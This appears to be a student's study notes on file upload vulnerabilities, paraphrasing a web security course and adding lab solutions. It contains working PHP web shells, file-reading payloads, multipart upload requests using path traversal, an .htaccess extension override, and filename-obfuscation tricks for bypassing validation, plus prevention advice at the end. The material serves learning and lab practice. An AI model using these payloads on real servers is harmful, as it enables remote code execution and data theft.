# **File upload vulnerabilities**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.</span>

## **What is the impact of file upload vulnerabilities?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">What restrictions are imposed on the file once it has been successfully uploaded</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as </span>`.php`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> and </span>`.jsp`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them full control over the server</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the filename isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> If the server is also vulnerable to </span>[directory traversal](https://portswigger.net/web-security/file-path-traversal)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, this could mean attackers are even able to upload files to unanticipated locations.</span>

## **How do file upload vulnerabilities arise?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the file type is executable, such as a PHP file, </span>**and**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the file type is executable, but the server </span>**is not**<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text.</span>

## **Exploiting unrestricted file uploads to deploy a web shell**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">PHP one-liner could be used to read arbitrary files from the server's filesystem:</span>

```php
<?php echo file_get_contents('/path/to/target/file'); ?>

<?php echo system($_GET['command']); ?>
GET /example/exploit.php?command=id HTTP/1.1
```

## **Exploiting flawed validation of file uploads**

### **<span style="font-size: 17px">Flawed file type validation</span>**

```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">One way that websites may attempt to validate file uploads is to check that this input-specific </span>`Content-Type`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> header matches an expected MIME type</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the server is only expecting image files, for example, it may only allow types like </span>`image/jpeg`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> and </span>`image/png`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.</span>

### **<span style="font-size: 17px">Preventing file execution in user-accessible directories</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute.</span>

```
------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="avatar"; filename="..%2fcmd.php"
Content-Type: php

<?php echo system($_GET['command']); ?>

------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="csrf"

l6DouhGwy1jnUGCzaFG53LvLOcIVahYg
------WebKitFormBoundaryCjGSdFibhljda6CZ--

use in the url /cmd.php?command=ls  //this will execute ls command in the server

------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="avatar"; filename="..%2fpeakpx.php"
Content-Type: php

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="csrf"

l6DouhGwy1jnUGCzaFG53LvLOcIVahYg
------WebKitFormBoundaryCjGSdFibhljda6CZ--
```

### **<span style="font-size: 17px">Insufficient blacklisting of dangerous file types</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like </span>`.php`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as </span>`.php5`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, </span>`.shtml`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, and so on.</span>

#### **<span style="font-size: 17px">Overriding the server configuration</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their </span>`/etc/apache2/apache2.conf`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> file:</span>

```http
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings</span>

**<span style="font-size: 17px">Lab :</span>**

```http
------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: php

AddType application/x-httpd-php .sujal
```

<span style="font-size: 17px">using the .htaccess config file of apache to create a new extenstion  .sujal</span>

```http
------WebKitFormBoundaryCjGSdFibhljda6CZ
Content-Disposition: form-data; name="avatar"; filename="cmd.sujal"
Content-Type: php

<?php echo system($_GET['command']); ?>
```

```http
GET /example/exploit.php?command=echo+"<?php+echo+file_get_contents('/home/carlos/secret');+?>"+|+cat+>>+gojo1.php HTTP/1.1
```

#### **<span style="font-size: 17px">Obfuscating file extensions</span>**

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Let's say the validation code is case sensitive and fails to recognize that </span>`exploit.pHp`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> is in fact a </span>`.php`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> file.</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: </span>`exploit.php.jpg`
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: </span>`exploit.php.`
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashesed: </span>`exploit%2Ephp`
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Add semicolons or URL-encoded null byte characters before the file extension.</span>`exploit.asp;.jpg` or `exploit.asp%00.jpg`
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like </span>`xC0 x2E`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, </span>`xC4 xAE`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> or </span>`xC0 xAE`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> may be translated to </span>`x2E`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension.</span>

```
exploit.p.phphp
```

**<span style="font-size: 17px">Lab :</span>**

<span style="font-size: 17px">Website only allow jpg and png upload so we used a null charater (%00) to comment out .jpg</span>

```http
exploit.php%00.jpg
```

### <span style="font-size: 17px">Flawed validation of the file's contents</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Instead of implicitly trusting the </span>`Content-Type`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes </span>`FF D8 FF`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">.</span>

### **<span style="font-size: 17px">Exploiting file upload </span>[<span style="font-size: 17px">race conditions</span>](https://portswigger.net/web-security/race-conditions)**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Modern frameworks generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.</span>

#### **<span style="font-size: 17px">Race conditions in URL-based file uploads</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">if the file is loaded into a temporary directory with a randomized name, in theory, it should be impossible for an attacker to exploit any race conditions. If they don't know the name of the directory, they will be unable to request the file in order to trigger its execution. On the other hand, if the randomized directory name is generated using pseudo-random functions like PHP's </span>`uniqid()`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, it can potentially be brute-forced.</span>

## **Exploiting file upload vulnerabilities without remote code execution**

### **<span style="font-size: 17px">Uploading malicious client-side scripts</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use </span>`<script>`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> tags to create </span>[stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> payloads.</span>

### **<span style="font-size: 17px">Exploiting vulnerabilities in the parsing of uploaded files</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office </span>`.doc`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> or </span>`.xls`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> files, this may be a potential vector for XXE injection attacks</span>

## **Uploading files using PUT**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">means of uploading malicious files, even when an upload function isn't available via the web interface</span>

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

## **How to prevent file upload vulnerabilities**

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (</span>`../`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">)</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Rename uploaded files to avoid collisions that may cause existing files to be overwritten</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Do not upload files to the server's permanent filesystem until they have been fully validated</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms</span>